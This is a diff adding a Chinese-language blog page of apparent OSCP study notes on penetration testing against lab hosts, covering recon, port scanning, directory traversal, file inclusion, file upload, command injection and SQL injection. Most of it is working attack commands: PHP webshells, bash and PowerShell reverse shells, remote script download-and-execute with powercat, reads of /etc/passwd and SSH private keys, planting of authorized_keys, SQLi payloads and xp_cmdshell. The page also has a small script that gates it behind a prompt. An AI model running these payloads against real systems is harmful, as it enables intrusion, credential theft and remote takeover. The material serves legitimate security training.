@@ -1,0 +1,3018 @@
+
+<html>
+  <head lang="zh">
+        <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+        <meta content="yes" name="apple-mobile-web-app-capable"/>
+        <meta content="black" name="apple-mobile-web-app-status-bar-style"/>
+        <meta content="telephone=no" name="format-detection"/>
+        <meta name="renderer" content="webkit">
+        <meta http-equiv="refresh" content="1800">
+    <title>HackTheHost | NothingBlog</title>
+<link href="https://10086skynet.top/styles/main.css" type="text/css" rel="stylesheet"/>
+<script type="text/javascript" src="https://10086skynet.top/media/scripts/jquery.js"></script>
+<script type="text/javascript" src="https://10086skynet.top/media/scripts/basic.js"></script>
+
+  </head>
+
+  <body>
+     <div class="header">
+      <div class="logo_title">
+		  
+        <div class="title animated fadeInDown"><img src="https://10086skynet.top/images/avatar.png?v=1770901159566"/>
+
+          <h1 title="NothingBlog" class="weaklink"><a href="/">NothingBlog</a>
+
+          </h1>
+
+          <div class="navbar weaklink">
+            <div class="normal_nav">
+
+<div class="bitcron_nav_container">
+
+
+  <div class="bitcron_nav">
+    <div class="mixed_site_nav_wrap site_nav_wrap">
+		
+      <ul class="mixed_site_nav site_nav sm sm-base">
+ 
+  <li><a id="d2ef19af68cc211e98f8a0242ac110003" href="https://10086skynet.top" class="selected active current nav__item" >首页</a>
+
+  </li>
+ 
+  <li><a id="d2ef19af68cc211e98f8a0242ac110003" href="https://10086skynet.top/about" class="selected active current nav__item" >关于</a>
+
+  </li>
+ 
+  <li><a id="d2ef19af68cc211e98f8a0242ac110003" href="https://10086skynet.top/ax9yB5qi4C" class="selected active current nav__item" >book</a>
+
+  </li>
+ 
+  <li><a id="d2ef19af68cc211e98f8a0242ac110003" href="https://10086skynet.top/wer435eN0K" class="selected active current nav__item" >star</a>
+
+  </li>
+ 
+
+      </ul>
+
+      <div class="clear clear_nav_inline_end"></div>
+
+    </div>
+
+  </div>
+
+
+
+  <div class="clear clear_nav_end"></div>
+
+</div>
+
+            </div>
+
+            <div class="hamberger"><i class="fa fa-bars"></i>
+<i class="fa fa-times"></i>
+
+            </div>
+
+          </div>
+
+        </div>
+
+      </div>
+
+      <div class="hidden_nav animated fadeInDown">
+
+<div class="bitcron_nav_container">
+
+
+  <div class="bitcron_nav">
+    <div class="mixed_site_nav_wrap site_nav_wrap">
+      <ul class="mixed_site_nav site_nav sm sm-base">
+		  
+	
+  <li><a id="d2ef19af68cc211e98f8a0242ac110003" href="https://10086skynet.top" class="selected active current nav__item" >首页</a>
+
+  </li>
+
+
+  <li><a id="d2ef19af68cc211e98f8a0242ac110003" href="https://10086skynet.top/about" class="selected active current nav__item" >关于</a>
+
+  </li>
+
+
+  <li><a id="d2ef19af68cc211e98f8a0242ac110003" href="https://10086skynet.top/ax9yB5qi4C" class="selected active current nav__item" >book</a>
+
+  </li>
+
+
+  <li><a id="d2ef19af68cc211e98f8a0242ac110003" href="https://10086skynet.top/wer435eN0K" class="selected active current nav__item" >star</a>
+
+  </li>
+
+
+
+
+
+      </ul>
+
+      <div class="clear clear_nav_inline_end"></div>
+
+    </div>
+
+  </div>
+
+
+
+  <div class="clear clear_nav_end"></div>
+
+</div>
+
+      </div>
+
+    </div>
+
+
+    <div class="main">
+      <div class="main-inner">
+
+
+<div class="content">
+
+
+
+
+
+
+  <div class="post_page" >
+
+<div class="post">
+  <div class="post_title sm_margin">
+    <h2><a>HackTheHost</a>
+
+
+
+    </h2>
+  </div>
+
+  <div class="post_details">
+    <div class="info"><i class="fa fa-clock-o"></i>
+<span class="date_info">2023-03-26</span>
+<i class="fa fa-eye"></i>
+
+
+<i class="fa fa-bookmark-o"></i>
+<span class="tags_info weaklink">
+	
+	<a href="https://10086skynet.top/PvCxc4cvbU/" class="tag">work</a>
+
+
+</span>
+
+
+    </div>
+
+  </div>
+
+
+
+
+
+  <div class="post_content markdown"><p class="md_block">
+    <span class="md_line md_line_start md_line_end"><script type="text/javascript">
+loopy()   
+function loopy() {
+var go =""  
+while (go != "oscp"){
+go = prompt("guess")   
+}
+alert("200")   
+}
+</script>
+<p>Fl*sy</p>
+<h2 id="62-被动信息收集">6.2 被动信息收集</h2>
+<h3 id="621-whois枚举">6.2.1 whois枚举</h3>
+<p>查域名（-h后面是whois服务器）</p>
+<pre><code class="language-python">whois megacorpone.com -h 192.168.50.251
+</code></pre>
+<p>查IP</p>
+<pre><code class="language-python">whois 38.100.193.70 -h 192.168.50.251
+</code></pre>
+<h3 id="622-谷歌黑客">6.2.2 谷歌黑客</h3>
+<p>查域名</p>
+<pre><code class="language-python">site:megacorpone.com
+</code></pre>
+<p>查看制定文件类型</p>
+<pre><code class="language-python">site:megacorpone.com filetype:txt
+</code></pre>
+<p>排除文件类型</p>
+<pre><code class="language-python">site:megacorpone.com -filetype:html
+</code></pre>
+<p>查找目录遍历</p>
+<pre><code class="language-python">intitle:&quot;index of&quot; &quot;parent directory&quot;
+</code></pre>
+<p>更多参考</p>
+<pre><code class="language-python">https://www.exploit-db.com/google-hacking-database 
+https://dorksearch.com/ 
+</code></pre>
+<h3 id="netcraft">Netcraft</h3>
+<p>地址</p>
+<pre><code class="language-python">searchdns.netcraft.com
+</code></pre>
+<h3 id="开源代码">开源代码</h3>
+<p>网站</p>
+<pre><code class="language-python">https://github.com/
+https://gist.github.com/
+https://about.gitlab.com/
+https://sourceforge.net/
+</code></pre>
+<p>搜索制定文件</p>
+<pre><code class="language-python">owner:megacorpone path:users
+</code></pre>
+<p>使用工具</p>
+<pre><code class="language-python">https://github.com/michenriksen/gitrob
+https://github.com/zricethezav/gitleaks
+</code></pre>
+<p>命令</p>
+<pre><code class="language-python">gitleaks-linux-arm64 -v -r=https://github.com/xxx/xxx
+</code></pre>
+<h3 id="shodan">Shodan</h3>
+<p>搜索host</p>
+<pre><code class="language-python">hostname:megacorpone.com
+</code></pre>
+<p>增加端口信息</p>
+<pre><code class="language-python">hostname:megacorpone.com port:&quot;22&quot;
+</code></pre>
+<h3 id="security-headers-and-ssltls">Security Headers and SSL/TLS</h3>
+<p>网站</p>
+<pre><code class="language-python">https://securityheaders.com/
+https://www.ssllabs.com/ssltest/
+</code></pre>
+<h2 id="63-主动信息收集">6.3 主动信息收集</h2>
+<h3 id="631-dns枚举">6.3.1 DNS枚举</h3>
+<p>DNS记录类型</p>
+<pre><code class="language-python">    NS: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
+    A: Also known as a host record, the &quot;a record&quot; contains the IPv4 address of a hostname (such as www.megacorpone.com).
+    AAAA: Also known as a quad A host record, the &quot;aaaa record&quot; contains the IPv6 address of a hostname (such as www.megacorpone.com).
+    MX: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
+    PTR: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.
+    CNAME: Canonical Name Records are used to create aliases for other host records.
+    TXT: Text records can contain any arbitrary data and be used for various purposes, such as domain ownership verification.
+</code></pre>
+<p>查域名ip</p>
+<pre><code class="language-python">host www.megacorpone.com
+</code></pre>
+<p>查邮件服务器等其他记录类型</p>
+<pre><code class="language-python">host -t mx megacorpone.com
+host -t txt megacorpone.com
+</code></pre>
+<p>批量枚举域名对应ip</p>
+<pre><code class="language-python">for ip in $(cat list.txt); do host $ip.megacorpone.com; done
+</code></pre>
+<p>批量枚举ip对应域名</p>
+<pre><code class="language-python">for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v &quot;not found&quot;
+</code></pre>
+<p>使用工具自动枚举</p>
+<pre><code class="language-python">dnsrecon -d megacorpone.com -t std
+dnsrecon -d megacorpone.com -D ~/list.txt -t brt
+dnsenum megacorpone.com
+</code></pre>
+<p>A记录枚举</p>
+<pre><code class="language-python">nslookup mail.megacorptwo.com
+</code></pre>
+<p>指定DNS服务器枚举</p>
+<pre><code class="language-python">nslookup -type=TXT info.megacorptwo.com 192.168.50.151
+</code></pre>
+<h3 id="端口扫描">端口扫描</h3>
+<pre><code class="language-python">-w 超时时间
+-z zero-I/O mode（无数据）
+</code></pre>
+<p>TCP</p>
+<pre><code class="language-python">nc -nvv -w 1 -z 192.168.50.152 3388-3390
+</code></pre>
+<p>UDP</p>
+<pre><code class="language-python">nc -nv -u -z -w 1 192.168.50.149 120-123
+</code></pre>
+<h3 id="nmap端口扫描">NMAP端口扫描</h3>
+<p>普通扫描</p>
+<pre><code class="language-python">nmap 192.168.50.149
+</code></pre>
+<p>全端口扫描</p>
+<pre><code class="language-python">nmap -p 1-65535 192.168.50.149
+</code></pre>
+<p>SYN扫描</p>
+<pre><code class="language-python">sudo nmap -sS 192.168.50.149
+</code></pre>
+<p>TCP连接扫描</p>
+<pre><code class="language-python">nmap -sT 192.168.50.149
+</code></pre>
+<p>UDP扫描</p>
+<pre><code class="language-python">sudo nmap -sU 192.168.50.149
+</code></pre>
+<p>UDP+SYN扫描</p>
+<pre><code class="language-python">sudo nmap -sU -sS 192.168.50.149
+</code></pre>
+<p>存活主机枚举</p>
+<pre><code class="language-python">nmap -sn 192.168.50.1-253
+
+nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt
+grep Up ping-sweep.txt | cut -d &quot; &quot; -f 2
+</code></pre>
+<p>指定端口及服务枚举</p>
+<pre><code class="language-python">nmap -p 80 192.168.50.1-253 -oG web-sweep.txt
+grep open web-sweep.txt | cut -d&quot; &quot; -f2
+</code></pre>
+<p>Top 20端口扫描</p>
+<pre><code class="language-python">nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt
+</code></pre>
+<p>操作系统指纹</p>
+<pre><code class="language-python">sudo nmap -O 192.168.50.14 --osscan-guess
+</code></pre>
+<p>服务枚举</p>
+<pre><code class="language-python">nmap -sT -A 192.168.50.14
+</code></pre>
+<p>nmap脚本扫描</p>
+<pre><code class="language-python">nmap --script http-headers 192.168.50.6
+</code></pre>
+<p>powershell端口扫描</p>
+<pre><code class="language-python">Test-NetConnection -Port 445 192.168.50.151
+</code></pre>
+<pre><code class="language-python">1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(&quot;192.168.50.151&quot;, $_)) &quot;TCP port $_ is open&quot;} 2&gt;$null
+</code></pre>
+<h3 id="smb枚举">SMB枚举</h3>
+<p>nmap端口扫描（139、445）</p>
+<pre><code class="language-python">nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254
+</code></pre>
+<p>udp 137端口枚举（-r参数）</p>
+<pre><code class="language-python">sudo nbtscan -r 192.168.50.0/24
+</code></pre>
+<p>nmap脚本相关</p>
+<pre><code class="language-python">ls -1 /usr/share/nmap/scripts/smb*
+nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
+</code></pre>
+<p>查看SMB共享</p>
+<pre><code class="language-python">net view \\dc01 /all
+</code></pre>
+<h3 id="smtp枚举">SMTP枚举</h3>
+<p>枚举主机用户</p>
+<pre><code class="language-python">nc -nv 192.168.50.8 25
+VRFY root
+VRFY idontexist
+</code></pre>
+<p>自动脚本</p>
+<pre><code class="language-python">#!/usr/bin/python
+
+import socket
+import sys
+
+if len(sys.argv) != 3:
+        print(&quot;Usage: vrfy.py &lt;username&gt; &lt;target_ip&gt;&quot;)
+        sys.exit(0)
+
+# Create a Socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Connect to the Server
+ip = sys.argv[2]
+connect = s.connect((ip,25))
+
+# Receive the banner
+banner = s.recv(1024)
+
+print(banner)
+
+# VRFY a user
+user = (sys.argv[1]).encode()
+s.send(b'VRFY ' + user + b'\r\n')
+result = s.recv(1024)
+
+print(result)
+
+# Close the socket
+s.close()
+</code></pre>
+<p>使用</p>
+<pre><code class="language-python">python3 smtp.py root 192.168.50.8
+</code></pre>
+<p>powershell枚举</p>
+<pre><code class="language-python">Test-NetConnection -Port 25 192.168.50.8
+telnet 192.168.50.8 25
+VRFY root
+</code></pre>
+<h3 id="snmp枚举">SNMP枚举</h3>
+<p>windows snmp</p>
+<pre><code class="language-python">1.3.6.1.2.1.25.1.6.0 	System Processes
+1.3.6.1.2.1.25.4.2.1.2 	Running Programs
+1.3.6.1.2.1.25.4.2.1.4 	Processes Path
+1.3.6.1.2.1.25.2.3.1.4 	Storage Units
+1.3.6.1.2.1.25.6.3.1.2 	Software Name
+1.3.6.1.4.1.77.1.2.25 	User Accounts
+1.3.6.1.2.1.6.13.1.3 	TCP Local Ports
+</code></pre>
+<p>nmap扫描udp的161端口</p>
+<pre><code class="language-python">sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
+</code></pre>
+<pre><code class="language-python">echo public &gt; community
+echo private &gt;&gt; community
+echo manager &gt;&gt; community
+for ip in $(seq 1 254); do echo 192.168.50.$ip; done &gt; ips
+onesixtyone -c community -i ips
+</code></pre>
+<p>自动化工具</p>
+<pre><code class="language-python">snmpwalk -c public -v1 -t 10 192.168.50.151
+</code></pre>
+<p>枚举windows用户</p>
+<pre><code class="language-python">snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
+</code></pre>
+<p>枚举windows进程</p>
+<pre><code class="language-python">snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2
+</code></pre>
+<p>枚举安装软件</p>
+<pre><code class="language-python">snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2
+</code></pre>
+<p>枚举开放端口</p>
+<pre><code class="language-python">snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3
+</code></pre>
+<h2 id="73-nmap漏洞扫描">7.3 Nmap漏洞扫描</h2>
+<h3 id="731-nse插件">7.3.1 NSE插件</h3>
+<p>查看nmap漏扫插件</p>
+<pre><code class="language-python">cd /usr/share/nmap/scripts/
+cat script.db  | grep &quot;\&quot;vuln\&quot;&quot;
+</code></pre>
+<p>使用脚本</p>
+<pre><code class="language-python">sudo nmap -sV -p 443 --script &quot;vuln&quot; 192.168.50.124
+</code></pre>
+<h3 id="732-nse插件编写">7.3.2 NSE插件编写</h3>
+<p>google搜索</p>
+<pre><code class="language-python">CVE-2021-41773 nse
+</code></pre>
+<p>新增脚本</p>
+<pre><code class="language-python">sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
+sudo nmap --script-updatedb
+</code></pre>
+<p>使用新脚本</p>
+<pre><code class="language-python">sudo nmap -sV -p 443 --script &quot;http-vuln-cve2021-41773&quot; 192.168.50.124
+</code></pre>
+<h2 id="82-web分析工具">8.2 Web分析工具</h2>
+<h3 id="821-web服务指纹">8.2.1 web服务指纹</h3>
+<p>nmap扫描web服务</p>
+<pre><code class="language-python">sudo nmap -p80  -sV 192.168.50.20
+</code></pre>
+<p>http枚举</p>
+<pre><code class="language-python">sudo nmap -p80 --script=http-enum 192.168.50.20
+</code></pre>
+<h3 id="822-wappalyzer">8.2.2 Wappalyzer</h3>
+<p>网站</p>
+<pre><code class="language-python">https://www.wappalyzer.com/
+</code></pre>
+<h3 id="823-目录枚举">8.2.3 目录枚举</h3>
+<pre><code class="language-python">gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
+</code></pre>
+<h3 id="824-burp">8.2.4 Burp</h3>
+<p>图形界面操作</p>
+<h2 id="83-web应用枚举">8.3 Web应用枚举</h2>
+<h3 id="832-http头和sitemaps枚举">8.3.2 http头和sitemaps枚举</h3>
+<pre><code class="language-python">curl https://www.google.com/robots.txt
+</code></pre>
+<h3 id="833-api枚举">8.3.3 API枚举</h3>
+<pre><code class="language-python">gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+
+curl -i http://192.168.50.16:5002/users/v1
+
+gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
+curl -i http://192.168.50.16:5002/users/v1/admin/password
+可能返回错误，一般需要post或者put，前提是要先登录成功
+curl -i http://192.168.50.16:5002/users/v1/login
+提示用户错误，尝试admin用户
+curl -d '{&quot;password&quot;:&quot;fake&quot;,&quot;username&quot;:&quot;admin&quot;}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+提示密码不对，注册新用户
+curl -d '{&quot;password&quot;:&quot;lab&quot;,&quot;username&quot;:&quot;offsecadmin&quot;}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
+提示需要email，增加email参数再注册
+curl -d '{&quot;password&quot;:&quot;lab&quot;,&quot;username&quot;:&quot;offsec&quot;,&quot;email&quot;:&quot;pwn@offsec.com&quot;,&quot;admin&quot;:&quot;True&quot;}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
+注册成功，登录
+curl -d '{&quot;password&quot;:&quot;lab&quot;,&quot;username&quot;:&quot;offsec&quot;}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+登录成功，获得token后，尝试修改admin密码
+curl  \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
+  -d '{&quot;password&quot;: &quot;pwned&quot;}'
+方法不允许，尝试put
+curl -X 'PUT' \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{&quot;password&quot;: &quot;pwned&quot;}'
+修改成功，登录admin
+curl -d '{&quot;password&quot;:&quot;pwned&quot;,&quot;username&quot;:&quot;admin&quot;}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+
+</code></pre>
+<h2 id="91-目录穿越">9.1 目录穿越</h2>
+<h3 id="912-目录穿越利用">9.1.2 目录穿越利用</h3>
+<pre><code class="language-python">http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
+http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+</code></pre>
+<pre><code class="language-python">curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+
+ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+提示权限不对
+chmod 400 dt_key
+ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+</code></pre>
+<p>‍</p>
+<h3 id="913-编码">9.1.3 编码</h3>
+<p>url编码</p>
+<pre><code class="language-python">curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
+不成功，可以尝试url编码
+
+curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+</code></pre>
+<h2 id="92-文件包含">9.2 文件包含</h2>
+<h3 id="921-本地文件包含">9.2.1 本地文件包含</h3>
+<pre><code class="language-python">curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+</code></pre>
+<p>User Agent加入webshell</p>
+<pre><code class="language-python">&lt;?php echo system($_GET['cmd']); ?&gt;
+</code></pre>
+<p>文件会写入</p>
+<pre><code class="language-python">../../../../../../../../../var/log/apache2/access.log
+</code></pre>
+<pre><code class="language-python">curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&amp;cmd=ls%20-la
+</code></pre>
+<p>反弹shell</p>
+<pre><code class="language-python">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.119.3/4444 0&gt;&amp;1&quot;
+</code></pre>
+<p>URL编码</p>
+<pre><code class="language-python">bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+</code></pre>
+<h3 id="922-php包装器">9.2.2 PHP包装器</h3>
+<p>文件读取</p>
+<pre><code class="language-python">curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+</code></pre>
+<p>base64解码</p>
+<pre><code class="language-python">echo &quot;PCFET0NUWVBFIGh……&quot; | base64 -d
+</code></pre>
+<p>命令执行</p>
+<pre><code class="language-python">curl &quot;http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system('ls');?&gt;&quot;
+</code></pre>
+<p>base64编码</p>
+<pre><code class="language-python">echo -n '&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;' | base64
+
+curl &quot;http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&amp;cmd=ls&quot;
+</code></pre>
+<h3 id="923-远程文件包含">9.2.3 远程文件包含</h3>
+<pre><code class="language-python">/usr/share/webshells/php/simple-backdoor.php
+python3 -m http.server 80
+curl &quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&amp;cmd=ls&quot;
+</code></pre>
+<h2 id="93-文件上传">9.3 文件上传</h2>
+<h3 id="931-可执行文件">9.3.1 可执行文件</h3>
+<p>文件后缀</p>
+<pre><code class="language-python">.phps
+.php7
+.php
+.phtml
+.pHP
+</code></pre>
+<p>修改后缀上传</p>
+<pre><code class="language-python">/usr/share/webshells/php/simple-backdoor.pHP
+</code></pre>
+<p>windows下base64编码后命令执行</p>
+<pre><code class="language-python">pwsh
+$Text = '$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.119.3&quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+</code></pre>
+<p>编码后使用webshell执行</p>
+<pre><code class="language-python">curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+...
+AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+</code></pre>
+<h3 id="932-不可执行文件">9.3.2 不可执行文件</h3>
+<p>post上传，文件名目录穿越</p>
+<pre><code class="language-python">../../../../../../../test.txt
+</code></pre>
+<p>生成ssh秘钥</p>
+<pre><code class="language-python">ssh-keygen
+fileup
+cat fileup.pub &gt; authorized_keys
+</code></pre>
+<p>文件名改为</p>
+<pre><code class="language-python">../../../../../../../root/.ssh/authorized_keys
+</code></pre>
+<p>上传后，ssh连接</p>
+<pre><code class="language-python">rm ~/.ssh/known_hosts
+ssh -p 2222 -i fileup root@mountaindesserts.com
+</code></pre>
+<p>注意：fileup文件权限，600或者400</p>
+<h2 id="94-命令执行">9.4 命令执行</h2>
+<h3 id="941-命令注入">9.4.1 命令注入</h3>
+<p>参数注入命令</p>
+<pre><code class="language-python">curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
+</code></pre>
+<p>提示不可执行，尝试正常命令git</p>
+<pre><code class="language-python">curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
+curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
+</code></pre>
+<p>执行成功，使用%3B拼接命令</p>
+<pre><code class="language-python">curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+</code></pre>
+<p>判断当前shell是cmd还是powershell</p>
+<pre><code class="language-python">(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
+</code></pre>
+<p>url编码后</p>
+<pre><code class="language-python">curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
+</code></pre>
+<p>输出是PowerShell</p>
+<p>执行成功，使用powercat获得反弹shell</p>
+<pre><code class="language-python">cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+python3 -m http.server 80
+nc -nvlp 4444
+</code></pre>
+<p>powershell执行</p>
+<pre><code class="language-python">IEX (New-Object System.Net.Webclient).DownloadString(&quot;http://192.168.119.3/powercat.ps1&quot;);powercat -c 192.168.119.3 -p 4444 -e powershell 
+</code></pre>
+<p>url编码</p>
+<pre><code class="language-python">curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
+</code></pre>
+<h2 id="101-sql及数据库基础">10.1 SQl及数据库基础</h2>
+<h3 id="1012-数据库基础">10.1.2 数据库基础</h3>
+<p>mysql登录数据库</p>
+<pre><code class="language-python">mysql -u root -p'root' -h 192.168.50.16 -P 3306
+</code></pre>
+<p>查看数据库版本</p>
+<pre><code class="language-python">select version();
+</code></pre>
+<p>查看系统用户</p>
+<pre><code class="language-python">select system_user();
+</code></pre>
+<p>查看数据库名</p>
+<pre><code class="language-python">show databases;
+</code></pre>
+<p>查看具体表中数据</p>
+<pre><code class="language-python">SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
+</code></pre>
+<p>mssql登录</p>
+<pre><code class="language-python">impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+</code></pre>
+<p>查看版本</p>
+<pre><code class="language-python">SELECT @@version;
+</code></pre>
+<p>查看数据库名</p>
+<pre><code class="language-python">SELECT name FROM sys.databases;
+</code></pre>
+<p>查看表名</p>
+<pre><code class="language-python">SELECT * FROM offsec.information_schema.tables;
+</code></pre>
+<p>查看具体表内容</p>
+<pre><code class="language-python">select * from offsec.dbo.users;
+</code></pre>
+<h2 id="102-sql注入">10.2 SQl注入</h2>
+<h3 id="1021-基于报错的sql注入">10.2.1 基于报错的sql注入</h3>
+<p>例子</p>
+<pre><code class="language-python">&lt;?php
+$uname = $_POST['uname'];
+$passwd =$_POST['password'];
+
+$sql_query = &quot;SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'&quot;;
+$result = mysqli_query($con, $sql_query);
+?&gt;
+</code></pre>
+<p>用户名输入</p>
+<pre><code class="language-python">offsec' OR 1=1 -- //
+</code></pre>
+<p>执行的sql语句是</p>
+<pre><code class="language-python">SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
+</code></pre>
+<p>可以绕过密码登录成功</p>
+<p>一般先用单引号测试</p>
+<pre><code class="language-python">offsec'
+</code></pre>
+<p>有报错信息可以尝试注入，获得数据库版本</p>
+<pre><code class="language-python">' or 1=1 in (select @@version) -- //
+</code></pre>
+<p>查询表中数据</p>
+<pre><code class="language-python">' OR 1=1 in (SELECT * FROM users) -- //
+</code></pre>
+<p>如果报错尝试查单列</p>
+<pre><code class="language-python">' or 1=1 in (SELECT password FROM users) -- //
+</code></pre>
+<p>查执行用户</p>
+<pre><code class="language-python">' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+</code></pre>
+<h3 id="1022-基于联合查询的sql注入">10.2.2 基于联合查询的SQL注入</h3>
+<p>例如</p>
+<pre><code class="language-python">$query = &quot;SELECT * from customers WHERE name LIKE '&quot;.$_POST[&quot;search_input&quot;].&quot;%'&quot;;
+</code></pre>
+<p>输入</p>
+<pre><code class="language-python">' ORDER BY 1-- //
+</code></pre>
+<p>提示报错或者出现列数，比如6</p>
+<pre><code class="language-python">%' UNION SELECT database(), user(), @@version, null, null -- //
+</code></pre>
+<p>联合查询会执行后面的查询依据，但是数据类型需要与原来字段一致，否则现实不出来，如果不一致可以改变位置</p>
+<pre><code class="language-python">' UNION SELECT null, null, database(), user(), @@version  -- //
+</code></pre>
+<pre><code class="language-python">' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+</code></pre>
+<pre><code class="language-python">' UNION SELECT null, username, password, description, null FROM users -- //
+</code></pre>
+<p>查表明、字段名、查数据均可</p>
+<h3 id="1023-盲注">10.2.3 盲注</h3>
+<p>不报错也没有回显，可以基于时间盲注</p>
+<pre><code class="language-python">http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
+</code></pre>
+<p>返回真，再用sleep函数做判断</p>
+<pre><code class="language-python">http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+</code></pre>
+<h2 id="103-自动执行代码">10.3 自动执行代码</h2>
+<h3 id="1031-代码执行">10.3.1 代码执行</h3>
+<p>mssql执行命令</p>
+<pre><code class="language-python">impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+EXECUTE xp_cmdshell 'whoami';
+</code></pre>
+<p>联合查询webshell写入</p>
